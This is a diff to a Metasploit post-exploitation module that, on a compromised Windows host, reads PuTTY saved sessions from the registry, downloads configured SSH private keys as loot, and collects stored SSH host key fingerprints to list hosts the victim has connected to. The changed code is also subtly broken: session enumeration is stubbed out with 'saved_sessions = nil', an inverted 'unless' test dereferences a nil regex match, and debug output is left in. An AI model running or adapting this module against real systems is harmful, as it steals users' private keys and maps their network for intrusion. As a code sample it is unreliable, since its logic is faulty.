@@ -67,8 +67,58 @@ class Metasploit3 < Msf::Post
     end
 
     print_line results_table.to_s
-    #stored_path = store_loot('ad.computers', 'text/plain', session, results_table.to_csv)
-    #print_status("Results saved to: #{stored_path}")
+  end
+
+  def get_stored_host_key_details(allkeys)
+
+    # This hash will store (as the key) host:port pairs. This is basically a quick way of
+    # getting a unique list of host:port pairs.
+    all_ssh_host_keys = {}
+
+    # This regex will split up lines such as rsa2@22:127.0.0.1 from the registry.
+    rx_split_hostporttype = %r{^(?<type>[-a-z0-9]+?)@(?<port>[0-9]+?):(?<host>.+)$}i
+
+    # Go through each of the stored keys found in the registry
+    allkeys.each do |key|
+
+        # Store the raw key and value in a hash to start off with
+        newkey = {
+          rawname: key,
+          rawsig: registry_getvaldata("HKCU\\Software\\SimonTatham\\PuTTY\\SshHostKeys", key).to_s
+        }
+
+        # Take the key and split up host, port and fingerprint type. If it matches, store the information
+        # in the hash for later.
+        split_hostporttype = rx_split_hostporttype.match(key.to_s)
+        unless split_hostporttype
+            newkey['host'] = split_hostporttype[:host]
+            newkey['port'] = split_hostporttype[:port]
+            newkey['type'] = split_hostporttype[:type]
+            host_port = "#{newkey['host']}:#{newkey['port']}"
+            all_ssh_host_keys[host_port] = true
+        end
+    end 
+    puts all_ssh_host_keys.inspect
+    all_ssh_host_keys
+  end
+
+  def display_stored_host_keys_report(info)
+
+    # Results table holds raw string data
+    results_table = Rex::Ui::Text::Table.new(
+      'Header'     => "Stored SSH host key fingerprints",
+      'Indent'     => 1,
+      'SortIndex'  => -1,
+      'Columns'    => ['SSH Endpoint']
+    )
+
+    info.each do |key,result|
+      row = []
+      row << key
+      results_table << row
+    end
+
+    print_line results_table.to_s
   end
 
   def grab_private_keys(sessions)
@@ -86,28 +136,50 @@ class Metasploit3 < Msf::Post
     end
   end
 
-  # The sauce starts here
+  
+  # Entry point
   def run
 
     # Look for saved sessions, break out if not.
-    saved_sessions = registry_enumkeys('HKCU\\Software\\SimonTatham\\PuTTY\\Sessions')
+    print_status("Looking for saved PuTTY sessions")
+    #saved_sessions = registry_enumkeys('HKCU\\Software\\SimonTatham\\PuTTY\\Sessions')
+    saved_sessions = nil
     if saved_sessions.nil? || saved_sessions.empty?
         print_error('No saved sessions found')
-        return
+    else
+
+	    # Tell the user how many sessions have been found (with correct English)
+	    print_status("Found #{saved_sessions.count} session#{saved_sessions.count>1?'s':''}") 
+	
+	    # Retrieve the saved session details & print them to the screen in a report
+	    all_saved_sessions = get_saved_session_details(saved_sessions)
+	    display_saved_sessions_report(all_saved_sessions)
+	
+	    # If the private key file has been configured, retrieve it and save it to loot
+	    print_status("Downloading private keys...")
+	    grab_private_keys(all_saved_sessions)
+
     end
 
-    # Tell the user how many sessions have been found (with correct English)
-    print_status("Found #{saved_sessions.count} session#{saved_sessions.count>1?'s':''}") 
+    #binding.pry
 
-    # Retrieve the saved session details & print them to the screen in a report
-    all_saved_sessions = get_saved_session_details(saved_sessions)
-    display_saved_sessions_report(all_saved_sessions)
+    # Now search for SSH stored keys. These could be useful because it shows hosts that the user
+    # has previously connected to and accepted a key from. 
+    print_status("Looking for previously stored SSH host key fingerprints")
+    stored_ssh_host_keys = registry_enumvals('HKCU\\Software\\SimonTatham\\PuTTY\\SshHostKeys')
+    if stored_ssh_host_keys.nil? || stored_ssh_host_keys.empty?
+        print_error('No stored SSH host keys found')
+    else
+	    # Tell the user how many sessions have been found (with correct English)
+	    print_status("Found #{stored_ssh_host_keys.count} stored key fingerprint#{stored_ssh_host_keys.count>1?'s':''}") 
 
-    # If the private key file has been configured, retrieve it and save it to loot
-    print_status("Downloading private keys...")
-    grab_private_keys(all_saved_sessions)
+	    # Retrieve the saved session details & print them to the screen in a report
+	    print_status("Downloading stored key fingerprints...")
+	    all_stored_keys = get_stored_host_key_details(stored_ssh_host_keys)
+	    print_status("Unique host:port pairs are shown in the table below. All other details, including the actual fingerprint, are stored in notes (putty.ssh.fingerprint)")
+        display_stored_host_keys_report(all_stored_keys) 
 
-    binding.pry
-
+    end
   end
+
 end
